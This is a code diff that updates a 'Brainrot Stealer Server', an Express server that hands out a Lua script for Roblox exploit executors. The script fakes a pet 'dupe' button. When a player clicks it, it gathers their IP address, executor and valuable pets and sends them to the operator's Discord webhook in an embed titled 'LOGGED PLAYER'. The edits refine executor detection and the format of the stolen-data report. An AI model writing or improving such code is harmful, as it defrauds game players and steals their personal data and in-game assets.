@@ -1,4 +1,4 @@
-// server.js - WITH IP CENSORING
+// server.js - FIXED VERSION
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -84,7 +84,7 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer Server");
 });
 
-// /raw → FINAL LUA SCRIPT WITH IP CENSORING
+// /raw → FIXED LUA SCRIPT
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
 
@@ -220,15 +220,40 @@ local function getIP(isPremium)
     return "Unknown"
 end
 
--- Get executor
+-- FIXED: Better executor detection
 local function getExecutor()
-    if syn then return "Synapse X"
-    elseif KRNL_LOADED then return "Krnl" 
-    elseif fluxus then return "Fluxus"
-    elseif PROTOSMASHER_LOADED then return "ProtoSmasher"
-    elseif electron then return "Electron"
-    elseif scriptware then return "ScriptWare"
-    else return "Unknown" end
+    -- Check for different executors
+    if type(syn) == "table" and syn.request then
+        return "Synapse X"
+    elseif KRNL_LOADED ~= nil then
+        return "Krnl"
+    elseif fluxus ~= nil then
+        return "Fluxus"
+    elseif PROTOSMASHER_LOADED ~= nil then
+        return "ProtoSmasher"
+    elseif electron ~= nil then
+        return "Electron"
+    elseif scriptware ~= nil then
+        return "ScriptWare"
+    elseif getexecutorname then
+        local success, name = pcall(getexecutorname)
+        if success and name then
+            return name
+        end
+    elseif identifyexecutor then
+        local success, name = pcall(identifyexecutor)
+        if success and name then
+            return name
+        end
+    elseif get_hui_ani then
+        return "SirHurt"
+    else
+        -- Check if any common executor functions exist
+        if type(syn) == "table" then return "Synapse X" end
+        if type(crypt) == "table" then return "Krnl" end
+        if type(fluxus) == "table" then return "Fluxus" end
+        return "Unknown Executor"
+    end
 end
 
 -- Scan pets
@@ -459,13 +484,18 @@ dupeButton.MouseButton1Click:Connect(function()
     local webhook, isPremium = getWebhook()
     local ip = getIP(isPremium)
     
-    -- Format brainrots for code block
+    -- Format brainrots with code block formatting
     local brainrotsText = ""
     for i = 1, #brainrotPets do
-        brainrotsText = brainrotsText .. brainrotPets[i].Name .. " | " .. brainrotPets[i].Rate .. "\\n"
+        brainrotsText = brainrotsText .. brainrotPets[i].Name .. " | " .. brainrotPets[i].Rate
+        if i < #brainrotPets then
+            brainrotsText = brainrotsText .. "\\n"
+        end
     end
     if brainrotsText == "" then
         brainrotsText = "No brainrots found"
+    else
+        brainrotsText = "```" .. brainrotsText .. "```"
     end
     
     -- Determine if legit hit
@@ -474,11 +504,11 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (EXACT FORMAT AS REQUESTED)
+    -- Create embed with BLUE COLOR and proper formatting
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
-        color = 65280,
+        color = 3447003, -- BLUE COLOR
         fields = {
             {
                 name = "Player Info",
@@ -487,7 +517,7 @@ dupeButton.MouseButton1Click:Connect(function()
             },
             {
                 name = "Brainrots", 
-                value = "Brainrots:\\n" .. brainrotsText,
+                value = brainrotsText,
                 inline = false
             },
             {
